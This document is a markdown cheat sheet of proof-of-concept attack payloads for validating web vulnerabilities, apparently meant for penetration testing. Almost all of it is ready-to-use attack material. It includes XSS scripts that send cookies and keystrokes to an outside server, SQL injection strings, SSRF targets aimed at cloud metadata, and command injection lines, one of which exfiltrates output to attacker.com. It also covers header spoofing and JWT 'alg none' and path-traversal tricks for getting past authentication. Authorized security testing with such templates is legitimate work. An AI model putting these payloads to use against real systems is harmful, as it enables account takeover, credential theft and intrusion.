# Vulnerability Validation POC Templates

## XSS POC Template

### Cookie Theft
```html
<script>
  fetch('https://YOUR_SERVER.log?c=' + encodeURIComponent(document.cookie));
</script>
```

### Keylogger
```html
<script>
  document.addEventListener('keypress', e => {
    fetch('https://YOUR_SERVER/log?k=' + e.key + '&t=' + Date.now());
  });
</script>
```

### Account Takeover (when HttpOnly not set)
```html
<script>
  document.location='https://YOUR_SERVER?cookie='+encodeURIComponent(document.cookie);
</script>
```

### Blind XSS (xsser)
```bash
xsser --Url "http://target.com/search?q=XSS" --cookie="session=value"
```

## SQLi POC Templates

### Union-based
```sql
' UNION SELECT NULL--
' UNION SELECT version()--
' UNION SELECT table_name FROM information_schema.tables--
```

### Boolean-based blind
```sql
' AND 1=1--
' AND 1=2--
```

### Time-based blind
```sql
' AND SLEEP(5)--
' WAITFOR DELAY '00:00:05'--
```

### Stacked queries
```sql
'; SELECT * FROM users--
```

## IDOR POC Template

```bash
# Step 1: Legitimate access as User A
curl -b "session=user_a_token" https://target.com/api/resource/12345

# Step 2: Same request with different ID as User A (should fail if fixed)
curl -b "session=user_a_token" https://target.com/api/resource/12346

# Step 3: Compare responses - if both return 200, IDOR exists
```

## SSRF POC Templates

### Basic confirmation
```bash
# Start listener: nc -lvnp 4444
# Then test:
http://localhost:4444/
http://127.1/
```

### Cloud metadata
```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
```

### Filter bypass
```bash
http://[::1]/
http://0/
http://127.0.0.1/
http://127.1/
```

## Command Injection POC

```bash
# Basic test
; whoami
| whoami
& whoami

# Blind command injection
; sleep 5
&& sleep 5
|| sleep 5

# Data exfiltration
; curl https://attacker.com/?q=$(whoami)
```

## Auth Bypass POC

### Header injection
```bash
X-Forwarded-Host: localhost
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

### JWT manipulation
```bash
# Change alg to none
eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.

# Null byte in kid
{"kid":"../../../../../../../../proc/self/environ"}
```

### Base64 encode, sign with empty key